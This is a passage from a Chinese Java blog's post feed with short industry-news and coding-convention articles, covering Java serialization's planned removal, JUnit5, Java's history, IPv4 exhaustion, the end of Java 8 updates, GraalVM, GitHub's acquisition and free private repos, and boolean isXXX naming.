      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%20%E5%BA%8F%E5%88%97%E5%8C%96%E6%8A%80%E6%9C%AF%E5%8D%B3%E5%B0%86%E8%A2%AB%E5%BA%9F%E9%99%A4%EF%BC%81%EF%BC%81%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Java%20%E5%BA%8F%E5%88%97%E5%8C%96%E6%8A%80%E6%9C%AF%E5%8D%B3%E5%B0%86%E8%A2%AB%E5%BA%9F%E9%99%A4%EF%BC%81%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>我们的对象并不只是存在内存中，还需要传输网络，或者保存起来下次再加载出来用，所以需要Java序列化技术。Java序列化技术正是将对象转变成一串由二进制字节组成的数组，可以通过将二进制数据保存到磁盘或者传输网络，磁盘或者网络接收者可以在对象的属类的模板上来反序列化类的对象，达到对象持久化的目的。</p><p>如果你还不熟悉 Java 序列化技术，请详细阅读《<a href="https://mp.weixin.qq.com/s/wHmK1kKyne6gCkIxt0NERQ">关于Java序列化你应该知道的一切</a>》这篇文章。</p><p>目前 Oracle 公司计划废除 Java 中的古董–序列化技术，因为它带来了许多严重的安全问题（如序列化存储安全、反序列化安全、传输安全等），据统计，至少有3分之1的漏洞是序列化带来的，这也是 1997 年诞生序列化技术的一个巨大错误。</p><p><img src="http://img.javastack.cn/18-5-29/43906619.jpg"></p><p>如图所示，序列化技术现在在 Java 应用中无处不在，特别是现在的持久化框架和分布式技术中，都需要利用序列化来传输对象，如：Hibernate、Mybatis、Java RMI、Dubbo等，即对象要存储或者传输都不可避免要用到序列化技术，所以删除序列化技术将是一个长期的计划。</p><p>据悉，在未来的 Java 版本中，将会有一个迷你序列化框架来替代现在的古董序列化技术。这个新框架将会支持开发者值入序列化引擎，并支持如 JSON、XML 格式，以一个更安全的方式来序列化对象。</p><p>序列化技术自 Java 诞生到现在已经发展了 20 来年了，但并未有什么改进和突破。也因为其简单易用的方式，给 Java 应用程序带来了许多安全漏洞。现在 Oracle 版本发布越来越快，让我们在新的版本中能看到更多序列化技术演进吧！</p><hr><p>Java 序列化重生，Java 会永垂不朽！这次感谢<strong>图灵教育出版社</strong>赞助 8 本价值 84 元的 <strong>《明解Java》</strong> 免费送给我们的粉丝，想深入学习 Java 的稳住了，我们一定能赢。</p><p><img src="http://img.javastack.cn/18-5-29/90269174.jpg"></p><blockquote><p>本书图文并茂，示例丰富，通过284幅图表和258段代码，由浅入深地解说了从Java的基础知识到面向对象编程的内容，涉及变量、分支、循环、基本数据类型和运算、数组、方法、类、包、接口、字符和字符串、异常处理等。书中出现的程序包括猜数游戏、猜拳游戏、心算训练等，能够让读者愉快地学习。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Junit5 新功能一览</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Junit5%20%E6%96%B0%E5%8A%9F%E8%83%BD%E4%B8%80%E8%A7%88/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/Junit5%20%E6%96%B0%E5%8A%9F%E8%83%BD%E4%B8%80%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<p>Java的JUnit测试框架已经来到了5这个版本，与以前的版本不同的是JUnit5具有来自多个子项目的模块，其中包括：</p><p>1、Platform，用于在JVM上启动测试框架，并通过命令行定义TestEngine API。</p><p>2、Jupiter，用于编写测试和扩展的编程和扩展模型，然后通过插件在JUnit、Gradle或Maven中来构建。</p><p>3、Vintage，用于在JUnit5平台上运行JUnit3和4测试用例。</p><p>在Jupiter中，开发人员可以使用注解作为元注解，可以在其中定义自动继承元注释语义的批注，即JUnit中的新编程模型。此外，Jupiter允许测试构造函数和方法参数，并具有更多的灵活性，且能为构造函数和方法启用依赖注入。</p><p>JUnit5在运行时需要依赖Java8或更高版本。但开发人员仍然可以测试以前JDK版本编译的代码。JUnit5模板不会随着JDK 9的编译模块描述符一起提供，但是会为JDK9的作预留。</p><p>测试可以在java类路径上运行，在这方面文档在Java8和9之间没有不同。此外，在模块路径上运行JUnit Jupiter的测试由Java9兼容的构建工具pro实现。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>今天是 Java 诞生日，Java 24 岁了！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E4%BB%8A%E5%A4%A9%E6%98%AF%20Java%20%E8%AF%9E%E7%94%9F%E6%97%A5%EF%BC%8CJava%2024%20%E5%B2%81%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E4%BB%8A%E5%A4%A9%E6%98%AF%20Java%20%E8%AF%9E%E7%94%9F%E6%97%A5%EF%BC%8CJava%2024%20%E5%B2%81%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/20190523100453.png"></p><p>今天是 Java 诞生日，Java 今年 24 岁了，比栈长还年轻。。还有得搞，别慌！作为一名Java语言的学习者，对Java的起源和发展有个大概的了解应是必要的。</p><p>1991年，Sun公司成立Green项目。Oak语言诞生。</p><p>1992年11月，Sun公司为Green项目成立FirstPerson公司。</p><p>1992年12月3日，被命名为Star7的面向一种类PDA的这台设备进行了展示，这种设备有鲜艳的图形界面和被称为“Duke”的智能代理来帮助用户。</p><p>1993年，FirstPerson公司重定位Oak。转向到网络应用领域（背景：WWW开始席卷全球）。</p><p>1994年6月，Oak技术包括源代码全部免费公开。Oak开发出小型万维网浏览器</p><p>WebRunner，后更名为Hotjava。Oak编写的Applet让网页由静态转成动态。</p><p>1995年，Oak注册登记时，发现该名已被占用，遂更名为Java。</p><p><strong>1995年5月23日，Sun公司在Sun world会议上正式发布Java和HotJava浏览器。</strong></p><p>1996年1月，Sun公司发布了Java的第一个开发工具包（JDK 1.0），这是Java发展历程中的重要里程碑，标志着Java成为一种独立的开发工具。</p><p>1996年9月，约8.3万个网页应用了Java技术来制作。</p><p>1996年10月，Sun公司发布了Java平台的第一个即时（JIT）编译器。</p><p>1997年2月，JDK1.1发布，在随后的3周时间里，达到了22万次的下载量。</p><p>1997年4月，JavaOne会议召开，参与者逾一万人，创当时全球同类会议规模之纪录。</p><p>1997年9月，JavaDeveloperConnection社区成员超过十万。</p><p>1998年2月，JDK1.1被下载超过2,000,000次。</p><p>1998年12月8日，JAVA2企业平台J2EE发布。</p><p>1999年4月27日，HotSpot虚拟机发布。HotSpot虚拟机发布时是作为JDK 1.2的附加程序提供的，后来它成为了JDK 1.3及之后所有版本的Sun JDK的默认虚拟机。</p><p>1999年6月，SUN公司发布Java的三个版本：标准版（JavaSE,以前是J2SE）、企业版（JavaEE以前是J2EE）和微型版（JavaME，以前是J2ME）。</p><p>2000年5月，JDK1.3，JDK1.4相继发布。</p><p>2001年6月5日，NOKIA宣布，到2003年将出售1亿部支持Java的手机。</p><p>2001年9月24日，J2EE1.3发布。</p><p>2002年2月26日，J2SE1.4发布，自此Java的计算能力有了大幅提升。</p><p>2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE1.5更名为JavaSE5.0。</p><p>2005年6月，JavaOne大会召开，SUN公司公开JavaSE6。此时，Java的各种版本已经更名，以取消其中的数字”2″：J2EE更名为JavaEE，J2SE更名为JavaSE，J2ME更名为JavaME。</p><p>2006年11月13日，Java技术的发明者Sun公司宣布，将Java技术作为免费软件对外发布。Sun公司正式发布的有关Java平台标准版的第一批源代码，以及Java迷你版的可执行源代码。</p><p>2006年12月，SUN公司发布JRE6.0。</p><p>2007年3月起，全世界所有的开发人员均可对Java源代码进行修改 。</p><p>2009年4月，甲骨文74亿美元收购Sun。取得java的版权。</p><p>2011年7月28日，甲骨文发布java7.0的正式版。</p><p>2014年，甲骨文（O）公司发布了Java8正式版。</p><p>2017年，甲骨文发布Java9。</p><p>2018年3月，甲骨文发布Java10。</p><p>2018年9月，甲骨文发布Java11。</p><p>2019年3月，甲骨文发布Java12。</p><blockquote><p>参考：<a href="http://www.sohu.com/a/194505161_775404">www.sohu.com/a/194505161_775404</a></p></blockquote><p>最后祝我大Java生日快乐，栈长给各位Java程序员准备了一份生日礼物，请笑纳：<a href="https://mp.weixin.qq.com/s/caQB7fmuWvqpdE5-AMSirg">Java 核心编程技术干货，2019 最新整理版！</a></p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全球 IPv4 地址正式耗尽</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E5%85%A8%E7%90%83%20IPv4%20%E5%9C%B0%E5%9D%80%E6%AD%A3%E5%BC%8F%E8%80%97%E5%B0%BD/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E5%85%A8%E7%90%83%20IPv4%20%E5%9C%B0%E5%9D%80%E6%AD%A3%E5%BC%8F%E8%80%97%E5%B0%BD/</url>
      
        <content type="html"><![CDATA[<p>重要消息：</p><p>就在 2019&#x2F;11&#x2F;25 UTC+1 15:35 时，一封来自欧洲 RIPE  NCC 的邮件中得到确认：全球的IPv4地址已经彻底耗尽。</p><p><img src="http://img.javastack.cn/20191127095348.png"></p><p>IPv4 大家应该很熟悉了，就是我们平常所知道的 IP 地址，如：<strong>192.168.1.168</strong>。</p><p>其实，很多年前就在说 IPv4 要用完了，只是没想到这天居然来得这么早，只能说互联网发展真的太快了。</p><p>对于 IPv4 地址耗尽的问题，大家也不用担心，全世界早就已经开始布局 IPv6 了，包括中国，据不完全统计，现在中国有超过 3 亿多的 IPv6 地址，居世界第一。</p><p><strong>那么  IPv6 到底是啥，和 IPv4 有啥区别呢？</strong></p><p>IPv6 即：Internet Protocol Version 6，第 6 代互联网协议，它的制定就是为了解决和应对 IPv4 即将会耗尽的问题的，毕竟 IPv4 数量有限，互联网又发展这么快，在可预见的将来，不……它现在已经用完了。</p><p>所以说，它们最大的区别就是数量了。</p><p>IPv4 最大网络地址数为：2^32 个（32位），即不到 43 亿个地址，而 IPv6 可达到 2^128 个（128位），具体多少已经数不清了，需要用科学表达式来表达了，但是可以知道的是，在可预见的未来是足够用了。</p><p>另外，IPv6 的格式和组成也和 IPv4 有相当大的区别，说了这么多，到底长啥样？</p><p>来看下面的地址，都是 IPv6 地址的示例：</p><pre class="line-numbers language-none"><code class="language-none">ABCD:EF01:2345:6789:ABCD:EF01:2345:6789 2001:0DB8:0000:0023:0008:0800:200C:417A 2001:DB8:0:23:8:800:200C:417A FF01:0:0:0:0:0:0:1101 FF01::1101 ::1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看完有没有觉得，这都是什么鬼啊。。</p><p>不得不说 IPv6 太复杂了，IPv4 已经很难记了，所以后面才有了 DNS ，有了域名来寻址，通过域名就能找到对应的 IP 服务器，因为域名要比 IP 要方便记、更形象化。</p><pre class="line-numbers language-none"><code class="language-none">正在 Ping www.javastack.cn [123.206.50.180] 具有 32 字节的数据:来自 123.206.50.180 的回复: 字节&#x3D;32 时间&#x3D;77ms TTL&#x3D;41来自 123.206.50.180 的回复: 字节&#x3D;32 时间&#x3D;77ms TTL&#x3D;41来自 123.206.50.180 的回复: 字节&#x3D;32 时间&#x3D;78ms TTL&#x3D;41来自 123.206.50.180 的回复: 字节&#x3D;32 时间&#x3D;79ms TTL&#x3D;41<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而现在的 IPv6 看着简直让人崩溃，地址长度要更长，表达形式更多、更复杂，要能很方便的记下来是不太现实了。</p><p>即使如此，我相信，随着互联网的快速发展，这些都会随着解决的，或者有更好的处理方式。毕竟 IPv6 是趋势了，因为 IPv4 已经耗尽了。</p><p>@All 你有什么想说的，欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天了噜，Java 8 要停止维护了！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E5%A4%A9%E4%BA%86%E5%99%9C%EF%BC%8CJava%208%20%E8%A6%81%E5%81%9C%E6%AD%A2%E7%BB%B4%E6%8A%A4%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E5%A4%A9%E4%BA%86%E5%99%9C%EF%BC%8CJava%208%20%E8%A6%81%E5%81%9C%E6%AD%A2%E7%BB%B4%E6%8A%A4%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>前些天的中兴事件，已经让国人意识到自己核心技术的不足，这次的 JDK 8 对企业停止免费更新更是雪上加霜。。</p><p>以下是 Oracle 官网提示的 JDK8 终止更新公告。</p><p><img src="http://img.javastack.cn/18-4-22/97341907.jpg"></p><blockquote><p>原文内容：Oracle will not post further updates of Java SE 8 to its public download sites for commercial use after January 2019. Customers who need continued access to critical bug fixes and security fixes as well as general maintenance for Java SE 8 or previous versions can get long term support through Oracle Java SE Advanced, Oracle Java SE Advanced Desktop, or Oracle Java SE Suite. For more information, and details on how to receive longer term support for Oracle JDK 8, please see the Oracle</p></blockquote><p><strong>翻译</strong></p><p>2019年1月之后，Oracle将不会在其网站上发布Java SE 8商业使用的进一步更新下载。那些需要持续获取安全的bug修复和安全补丁以及Java SE 8或以前版本的稳定性支持可以通过Oracle Java SE高级版，Oracle Java SE高级桌面，或Oracle Java SE套件。有关更多信息以及如何获得Oracle JDK 8长期支持的详细信息，请参阅Oracle支持路线图。</p><p><strong>公开更新路线图如下：</strong></p><p><img src="http://img.javastack.cn/18-4-22/50501811.jpg"></p><p><code>*</code>：表示支持的最晚日期；</p><p><code>**</code> 和 <code>***</code>：大概意思就是这是一个周期很短的版本，用户很快会切换到另外一个可用的更新版；</p><p><code>****</code>：Oracle在2017年12宣布了会发布更简单快速的发布路线图，将在2018年9月开始生效。</p><p><strong>Java支持路线图如下：</strong></p><p><img src="http://img.javastack.cn/18-4-23/39827906.jpg"></p><p>说那么多，简短来说就是 Java 8 在 2O19 年 1 月之后不再免费向企业提供更新，想要更新就得付钱或者升级到 Java 9 之上。。</p><p><strong>现在要做的就是赶紧熟悉 Java 9，不然就付费吧，妈蛋，Java 8 相信很多人到现在都没用熟。。。</strong></p><p>Java要被 Oracle 玩死了吗？大家有何感想？</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>屌炸天，Oracle 发布了一个全栈虚拟机！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E5%B1%8C%E7%82%B8%E5%A4%A9%EF%BC%8COracle%20%E5%8F%91%E5%B8%83%E4%BA%86%E4%B8%80%E4%B8%AA%E5%85%A8%E6%A0%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E5%B1%8C%E7%82%B8%E5%A4%A9%EF%BC%8COracle%20%E5%8F%91%E5%B8%83%E4%BA%86%E4%B8%80%E4%B8%AA%E5%85%A8%E6%A0%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>前阵子，Oracle 发布了一个黑科技 “GraalVM”，号称是一个全新的通用全栈虚拟机，并具有高性能、跨语言交互等逆天特性，真有这么神奇？</p><h3 id="GraalVM-简介"><a href="#GraalVM-简介" class="headerlink" title="GraalVM 简介"></a>GraalVM 简介</h3><p>GraalVM 是一个跨语言的通用虚拟机，不仅支持了 Java、Scala、Groovy、Kotlin 等基于 JVM 的语言，以及 C、C++ 等基于 LLVM 的语言，还支持其他像 JavaScript、Ruby、Python 和 R 语言等。</p><p><strong>GraalVM 有以下几个特性。</strong></p><ul><li>更加高效快速的运行代码</li><li>能与大多数编程语言直接交互</li><li>使用 Graal SDK 嵌入多语言</li><li>创建预编译的原生镜像</li><li>提供一系列工具来监视、调试和配置所有代码</li></ul><blockquote><p>官网：<a href="http://www.graalvm.org/">http://www.graalvm.org/</a></p></blockquote><h3 id="GraalVM-有什么用？"><a href="#GraalVM-有什么用？" class="headerlink" title="GraalVM 有什么用？"></a>GraalVM 有什么用？</h3><h4 id="1、支持多种语言组合编程"><a href="#1、支持多种语言组合编程" class="headerlink" title="1、支持多种语言组合编程"></a>1、支持多种语言组合编程</h4><p>来看下面这段代码，来自官网。</p><pre class="line-numbers language-none"><code class="language-none">const express &#x3D; require(&#39;express&#39;);const app &#x3D; express();app.listen(3000);app.get(&#39;&#x2F;&#39;, function(req, res) &#123;  var text &#x3D; &#39;Hello World!&#39;;  const BigInteger &#x3D; Java.type(    &#39;java.math.BigInteger&#39;);  text +&#x3D; BigInteger.valueOf(2)    .pow(100).toString(16);  text +&#x3D; Polyglot.eval(    &#39;R&#39;, &#39;runif(100)&#39;)[0];  res.send(text);&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它同时使用了 Node.js、Java、R 三种语言，是不是很奇葩？</p><p>GraalVM 消除了各种编程语言之间的隔离性，那这种多编程语言结合使用会不会有性能影响？官方的说明是：零开销的互操作，这样，我们就可以为应用程序选择最佳的编程语言组合。</p><h4 id="2、原生镜像加速"><a href="#2、原生镜像加速" class="headerlink" title="2、原生镜像加速"></a>2、原生镜像加速</h4><p>来看这段代码，同样来自官网。</p><pre class="line-numbers language-none"><code class="language-none">$ javac HelloWorld.java$ time java HelloWorlduser 0.070s$ native-image HelloWorld$ time .&#x2F;helloworlduser 0.005s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GraalVM 可以预编译成原生镜像，从而极大提速了启动时间，并能减少 JVM 应用的内存占用。</p><h4 id="4、可嵌入式运行环境"><a href="#4、可嵌入式运行环境" class="headerlink" title="4、可嵌入式运行环境"></a>4、可嵌入式运行环境</h4><p>GraalVM 可以被嵌入到各种应用程序中，既可以独立运行，也可以在已经内置好的 OpenJDK、Node.js、Oracle、MySQL 等环境中运行。</p><p>结合上面的特性，我们来看下 GraalVM 的架构图。</p><p><img src="http://img.javastack.cn/18-7-25/26341155.jpg"></p><h3 id="GraalVM-版本介绍"><a href="#GraalVM-版本介绍" class="headerlink" title="GraalVM 版本介绍"></a>GraalVM 版本介绍</h3><p>如下图所示，GraalVM 提供了社区版和企业版两个版本。</p><p><img src="http://img.javastack.cn/18-7-25/16994384.jpg"></p><p>从特性来看，上述所说的高性能、内存优化貌似都在企业版中？？企业版或者可能只是在社区版上又增加了额外的提升吧！</p><blockquote><p>社区版下载：github.com&#x2F;oracle&#x2F;graal&#x2F;releases</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>GraalVM 这玩意看起来很不错，可以说这就是一个全栈开发平台，不仅支持主流编程语言，还能组合在一起编程，根据不同任务来选择最佳的语言。另外。它还能提高更高的执行效率，以及占用更少的内存。</p><p>至于应用场景，是否可应用于生产，现在还真不好说。这么一个变态级的产品，我们期待它有更好的发展吧。</p><p>@ 程序猿：你们觉得 GraalVM 前景如何，或者有什么实际用途？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恭喜微微软喜当爹，Github 嫁入豪门。</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E6%81%AD%E5%96%9C%E5%BE%AE%E5%BE%AE%E8%BD%AF%E5%96%9C%E5%BD%93%E7%88%B9%EF%BC%8CGithub%20%E5%AB%81%E5%85%A5%E8%B1%AA%E9%97%A8%E3%80%82/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E6%81%AD%E5%96%9C%E5%BE%AE%E5%BE%AE%E8%BD%AF%E5%96%9C%E5%BD%93%E7%88%B9%EF%BC%8CGithub%20%E5%AB%81%E5%85%A5%E8%B1%AA%E9%97%A8%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>今天是 Github 嫁入豪门的第 2 天，炒得沸沸扬扬的微软 Github 收购事件于昨天（06月04日）尘埃落定，微软最终以 75 亿美元正式收购 Github。</p><p>随后，Gitlab 趁势带了一波节奏，在其官网上祝贺 Github 被微软收购，并表示此次收购代表着软件开发者的影响力的日渐增长，将软件开发的下一个发展看成是每个人都可以贡献的世界。</p><p><img src="http://img.javastack.cn/18-6-4/95497790.jpg"></p><blockquote><p>原文：<a href="https://about.gitlab.com/2018/06/03/microsoft-acquires-github/">https://about.gitlab.com/2018/06/03/microsoft-acquires-github/</a></p></blockquote><p>更有网友称这是一桩最滑稽的收购案，世界上最大的闭源公司收购了世界上最大的开源公司。</p><p>微软公司的实力不用说，操作系统、办公套件几乎被微软垄断，你没见过国内用 Linux 系统上班的吧，Mac 也只是小众，太贵，也并不是所有普通人能用得起的。</p><p>Github 作为后起之秀，成立于 2008 年 4 月，截至 2018 年 3 月已刚好 10 年，其开源社区就已超过 2800 万开发人员，以及 8500 多万个代码库。我们 Java 的各种开源框架如 Spring、Mybatis、Dubbo 等都是托管在 Github下,所以说它是世界上最大的开源公司一点也不为过。</p><p>这 10 年来，Github 并未盈利，其主要盈利来源也只是其私有的个人仓库（7美元&#x2F;月）及一些企业化的功能，大部分人都是免费使用其公有仓库来托管代码的。我就是公有仓库的受益者，不是我不付费，而免费的替换者实在太多了，Gitlab 还有国内的码云等都是免费支持私有仓库的。</p><p>所以 Github 卖身微软也说得过去，比起上市，被巨头收购可能更适合 Github 的后续发展。毕竟微软也作为曾经的龙头企业，一直以来也是采用 Git 协议，自身也有许项目需要用到代码托管，目前就已有超过 1000 个微软开发人员在 Github 上贡献代码，已是 Github 的最大贡献者。</p><p>微软购买 Github 后，可能会有很多开发人员弃坑，而选择其他的代码托管平台。为什么呢？微软在开源上已经是十分保守的，而且有着许多大公司都有的大公司病，后续如何善待 Github 还真不好说，让我们静静期待在微软统领下的 Github 的更多的变化吧。</p><p>总之，恭喜微软喜当爹，也恭喜 Github 嫁入豪门。这逻辑貌似有点问题，总之恭喜了。。</p><p>你如何看待 GIthub 的后续发展？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新年放大招：Github 私库免费了！</title>
      <link href="/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E6%96%B0%E5%B9%B4%E6%94%BE%E5%A4%A7%E6%8B%9B%EF%BC%9AGithub%20%E7%A7%81%E5%BA%93%E5%85%8D%E8%B4%B9%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/30/%E8%A1%8C%E4%B8%9A%E5%8A%A8%E6%80%81/%E6%96%B0%E5%B9%B4%E6%94%BE%E5%A4%A7%E6%8B%9B%EF%BC%9AGithub%20%E7%A7%81%E5%BA%93%E5%85%8D%E8%B4%B9%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/19-1-8/64848129.jpg"></p><p>据《<a href="https://mp.weixin.qq.com/s/eC_oIGY4rJL80Hp30Hz7JA">Github 嫁入豪门</a>》这篇文章刚好半年了，那时候栈长还表示对 Github 的期待，仅仅半年，现在就已经有了巨大改变。</p><p>微软果然是豪门，嫁入半年就已经开花结果了，免费私库已全面无限制开启……</p><p><strong>我们来看下 Github 的官宣：</strong></p><blockquote><p>New year, new GitHub: Announcing unlimited free private repos and unified Enterprise offering</p></blockquote><p>新年，新的 Github, Github 宣布了两个重大更新：</p><p><strong>1、无限制免费私库（GitHub Free）</strong></p><p>即现在可以无限制的免费使用 Github 私有仓库，让开发人员更好的使用 GitHub，不过最多只有 3 个免费协作成员。</p><p><strong>2、统一的企业产品（GitHub Enterprise）</strong></p><p>Github 提供了更简单、灵活、统一的企业产品，通过 GitHub Connect 可以连接打通云仓库以及本地化仓库。</p><p><strong>下面我们来演示一下如何创建一个私库：</strong></p><p><img src="http://img.javastack.cn/19-1-8/73479719.jpg"></p><p>如图所示，选择 Private 即可，之前这个选项是必须付费才能开放的，现在免费无限制放开了。</p><p>我们再来看下如何添加协作者：</p><p><img src="http://img.javastack.cn/19-1-8/34339368.jpg"></p><p>如图所示，搜索需要协作的成员进行添加，需要对方同意。只能添加 3 个协作者，也只有被添加进来的协作者才能拥有项目的访问和提交权限，也可以取消协作成员。</p><p>现在开始创建年轻人的第一个 Github 免费私库吧！</p><p><strong>更多详情：</strong></p><blockquote><p><a href="https://blog.github.com/2019-01-07-new-year-new-github/">https://blog.github.com/2019-01-07-new-year-new-github/</a></p></blockquote><p>据栈长所知，现在免费开放私库的产品有国内的码云、Coding，以及国外的 Gitlab 等，现在 Github 也加入免费行列，必定残食其他的市场份额。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 行业动态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>疯了！同事又问我为什么不能用 isXXX</title>
      <link href="/2025/10/30/%E8%A7%84%E8%8C%83/%E7%96%AF%E4%BA%86%EF%BC%81%E5%90%8C%E4%BA%8B%E5%8F%88%E9%97%AE%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%94%A8%20isXXX/"/>
      <url>/2025/10/30/%E8%A7%84%E8%8C%83/%E7%96%AF%E4%BA%86%EF%BC%81%E5%90%8C%E4%BA%8B%E5%8F%88%E9%97%AE%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%94%A8%20isXXX/</url>
      
        <content type="html"><![CDATA[<p>最近在做Code Review，写下了这篇文章：<a href="https://mp.weixin.qq.com/s/_ehJH-JWEBXg4FznDsDMYA">代码写成这样，老夫无可奈何！</a>，说多了都是泪啊。。</p><p><strong>最近又有人同事跑过来质疑我：</strong> 为什么变量名取名不能用 <code>isXXX</code> 这种方式，这样有什么问题？！</p><p>醉了，讲了好多次都记不住，我让他自己去看阿里巴巴的《Java开发手册》，或者自行百度，说实话，有点工作经验人都知道，这都是基础的东西。</p><p>本没什么好写的，鉴于有好多小白程序员，今天栈长就把为什么不能用 <code>isXXX</code> 拿出来分享一篇文章吧，希望对你有用。</p><p>首先我们来看阿里巴巴的《Java开发手册》关于 <code>isXXX</code> 是怎么定义的吧：</p><blockquote><p> 【强制】POJO 类中布尔类型变量都不要加 is 前缀，否则部分框架解析会引起序列化错误。<br>反例：定义为基本数据类型 Boolean isDeleted 的属性，它的方法也是 isDeleted()，RPC 框架在反向解析的时候，“误以为”对应的属性名称是 deleted，导致属性获取不到，进而抛出异常。</p></blockquote><p>上面的规范很容易理解吧，就是如果使用 <code>isXXX</code> 这种命名形式会引起潜在的异常呗！</p><p><strong>我们再来看一段 IDE 生成的 getter&#x2F;setter 代码：</strong></p><pre class="line-numbers language-none"><code class="language-none">public class Staff &#123;    private String name;    private boolean graduated;    private boolean isMarried;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name &#x3D; name;    &#125;    public boolean isGraduated() &#123;        return graduated;    &#125;    public void setGraduated(boolean graduated) &#123;        this.graduated &#x3D; graduated;    &#125;    public boolean isMarried() &#123;        return isMarried;    &#125;    public void setMarried(boolean married) &#123;        isMarried &#x3D; married;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变量 <code>isMarried</code> 生成的 getter&#x2F;setter 方法是：isMarried&#x2F;setMarried，有些框架就会去找对应的 <code>married</code> 变量，然后就找不到了…</p><p>再看变量 <code>graduated</code>，因为都是 boolean 变量，所有生成的逻辑和 <code>isMarried</code> 一样，根据上述规范，它不会产生找不着值的情况，这也是为什么不建议使用 <code>isXXX</code> 的命名形式。</p><p>这个问题我之前有个同事在使用某个 Web 框架的时候就遇到过，在页面上使用该框架的标签显示对象的值，如：xx.xxx，然后就死活取不到值，还报异常，最后定位就是这个问题。</p><p>再看到有同事这样写，或者问你为什么，把这篇文章丢给他吧。。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 规范 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里巴巴制定了这 16 条设计规约！</title>
